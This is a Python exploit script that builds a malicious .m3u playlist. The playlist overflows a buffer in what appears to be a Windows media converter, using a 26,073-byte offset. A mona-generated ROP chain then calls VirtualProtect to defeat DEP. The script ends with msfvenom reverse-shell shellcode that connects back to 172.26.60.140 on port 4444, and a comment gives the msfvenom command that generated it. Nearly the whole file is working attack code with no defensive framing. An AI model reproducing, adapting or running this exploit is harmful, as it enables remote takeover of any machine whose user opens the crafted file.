import struct
import os 
import sys

class Exploit:
    PAYLOAD_FILE = os.getcwd() + "\\exp.m3u"
    BADCHAR_FILE = os.getcwd() + "\\badchar.bin"
    OFFSET = 26073

    @classmethod
    def conv_addr(cls, addr):
        return struct.pack("<I", addr)

    @classmethod
    def generate_badchar(cls):
        badchar_str = b""
        badchar_list = [0x00, 0x0a]

        for i in range(0x00, 0xff + 1):
            if i not in badchar_list:
                badchar_str += struct.pack("B", i)

        with open(cls.BADCHAR_FILE, "wb+") as bf:
            bf.write(badchar_str)

        return badchar_str

    @classmethod
    def save_payload(cls, payload):
        try:
            with open(cls.PAYLOAD_FILE, "wb+") as pf:
                pf.write(payload)

            print("[+] Done writing.")

        except:
            print("[!] Error, unable to write to file.")
            sys.exit(1)
        
    @classmethod
    def create_rop_chain(cls):
        '''
        Register setup for VirtualProtect() :
        --------------------------------------------
        EAX = NOP (0x90909090)
        ECX = lpOldProtect (ptr to W address)
        EDX = NewProtect (0x40)
        EBX = dwSize
        ESP = lPAddress (automatic)
        EBP = ReturnTo (ptr to jmp esp)
        ESI = ptr to VirtualProtect()
        EDI = ROP NOP (RETN)
        --- alternative chain ---
        EAX = ptr to &VirtualProtect()
        ECX = lpOldProtect (ptr to W address)
        EDX = NewProtect (0x40)
        EBX = dwSize
        ESP = lPAddress (automatic)
        EBP = POP (skip 4 bytes)
        ESI = ptr to JMP [EAX]
        EDI = ROP NOP (RETN)
        + place ptr to "jmp esp" on stack, below PUSHAD
        --------------------------------------------
        '''

        # !mona rop -m *.dll  -cpb '\x00\x0a\x0d' 
        # rop chain generated with mona.py - www.corelan.be
        rop_gadgets = [
        
        #[---INFO:gadgets_to_set_esi:---]
        0x1002d414,  # POP EAX # RETN [MSRMfilter03.dll]
        0x5d091358,  # ptr to &VirtualProtect() [IAT COMCTL32.dll]
        0x7ca181da,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [SHELL32.dll] 
        0x77f53564,  # XCHG EAX,ESI # RETN [GDI32.dll] 
        
        #[---INFO:gadgets_to_set_ebp:---]
        0x1002dc43,  # POP EBP # RETN [MSRMfilter03.dll] 
        0x7608fcfe,  # & push esp # ret  [MSVCP60.dll]
        
        #[---INFO:gadgets_to_set_ebx:---]
        0x1002d414,  # POP EAX # RETN [MSRMfilter03.dll]
        0xfffffdff,  # Value to negate, will become 0x00000201
        0x7722b8df,  # NEG EAX # RETN [WININET.dll] 
        0x7c9059c8,  # XCHG EAX,EBX # RETN [ntdll.dll] 
        
        #[---INFO:gadgets_to_set_edx:---]
        0x77538c83,  # POP EAX # RETN [ole32.dll] 
        0xffffffc0,  # Value to negate, will become 0x00000040
        0x73e5f32b,  # NEG EAX # RETN [MFC42.DLL] 
        0x771213b4,  # XCHG EAX,EDX # RETN [OLEAUT32.dll] 
        
        #[---INFO:gadgets_to_set_ecx:---]
        0x10023726,  # POP ECX # RETN [MSRMfilter03.dll] 
        0x01dbeadf,  # &Writable location [MSVCIRT.dll] ** REBASED
        
        #[---INFO:gadgets_to_set_edi:---]
        0x77a8c70b,  # POP EDI # RETN [CRYPT32.dll] 
        0x76091003,  # RETN (ROP NOP) [MSVCP60.dll]
        
        #[---INFO:gadgets_to_set_eax:---]
        0x7608b884,  # POP EAX # RETN [MSVCP60.dll] 
        0x90909090,  # nop
        
        #[---INFO:pushad:---]
        0x77c12df9,  # PUSHAD # RETN [msvcrt.dll] 
        ]
        
        return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

    @classmethod
    def create_payload(cls):
        disable_dep = cls.create_rop_chain()   

        nop_sled = b"\x90" * 64

        # msfvenom -p windows/shell_reverse_tcp LHOST=172.26.60.140 LPORT=4444 -f python -b "\x00\x0a\x0d"
        buf =  b""
        buf += b"\xdb\xca\xba\x4f\xe2\xe3\x0b\xd9\x74\x24\xf4\x5d\x29"
        buf += b"\xc9\xb1\x52\x31\x55\x17\x03\x55\x17\x83\x8a\xe6\x01"
        buf += b"\xfe\xe8\x0f\x47\x01\x10\xd0\x28\x8b\xf5\xe1\x68\xef"
        buf += b"\x7e\x51\x59\x7b\xd2\x5e\x12\x29\xc6\xd5\x56\xe6\xe9"
        buf += b"\x5e\xdc\xd0\xc4\x5f\x4d\x20\x47\xdc\x8c\x75\xa7\xdd"
        buf += b"\x5e\x88\xa6\x1a\x82\x61\xfa\xf3\xc8\xd4\xea\x70\x84"
        buf += b"\xe4\x81\xcb\x08\x6d\x76\x9b\x2b\x5c\x29\x97\x75\x7e"
        buf += b"\xc8\x74\x0e\x37\xd2\x99\x2b\x81\x69\x69\xc7\x10\xbb"
        buf += b"\xa3\x28\xbe\x82\x0b\xdb\xbe\xc3\xac\x04\xb5\x3d\xcf"
        buf += b"\xb9\xce\xfa\xad\x65\x5a\x18\x15\xed\xfc\xc4\xa7\x22"
        buf += b"\x9a\x8f\xa4\x8f\xe8\xd7\xa8\x0e\x3c\x6c\xd4\x9b\xc3"
        buf += b"\xa2\x5c\xdf\xe7\x66\x04\xbb\x86\x3f\xe0\x6a\xb6\x5f"
        buf += b"\x4b\xd2\x12\x14\x66\x07\x2f\x77\xef\xe4\x02\x87\xef"
        buf += b"\x62\x14\xf4\xdd\x2d\x8e\x92\x6d\xa5\x08\x65\x91\x9c"
        buf += b"\xed\xf9\x6c\x1f\x0e\xd0\xaa\x4b\x5e\x4a\x1a\xf4\x35"
        buf += b"\x8a\xa3\x21\x99\xda\x0b\x9a\x5a\x8a\xeb\x4a\x33\xc0"
        buf += b"\xe3\xb5\x23\xeb\x29\xde\xce\x16\xba\x4d\x14\x24\xb6"
        buf += b"\xe6\x2b\x54\xd7\xaa\xa2\xb2\xbd\x42\xe3\x6d\x2a\xfa"
        buf += b"\xae\xe5\xcb\x03\x65\x80\xcc\x88\x8a\x75\x82\x78\xe6"
        buf += b"\x65\x73\x89\xbd\xd7\xd2\x96\x6b\x7f\xb8\x05\xf0\x7f"
        buf += b"\xb7\x35\xaf\x28\x90\x88\xa6\xbc\x0c\xb2\x10\xa2\xcc"
        buf += b"\x22\x5a\x66\x0b\x97\x65\x67\xde\xa3\x41\x77\x26\x2b"
        buf += b"\xce\x23\xf6\x7a\x98\x9d\xb0\xd4\x6a\x77\x6b\x8a\x24"
        buf += b"\x1f\xea\xe0\xf6\x59\xf3\x2c\x81\x85\x42\x99\xd4\xba"
        buf += b"\x6b\x4d\xd1\xc3\x91\xed\x1e\x1e\x12\x1d\x55\x02\x33"
        buf += b"\xb6\x30\xd7\x01\xdb\xc2\x02\x45\xe2\x40\xa6\x36\x11"
        buf += b"\x58\xc3\x33\x5d\xde\x38\x4e\xce\x8b\x3e\xfd\xef\x99"

        bof  = b"A" * cls.OFFSET
        bof += cls.conv_addr(0x1001c121) # ret
        bof += b"B" * 4 # FILLER        
        bof += disable_dep
        bof += nop_sled
        bof += buf

        print("[+] Creating payload.")
        cls.save_payload(bof)

if __name__ == "__main__":
    Exploit.create_payload()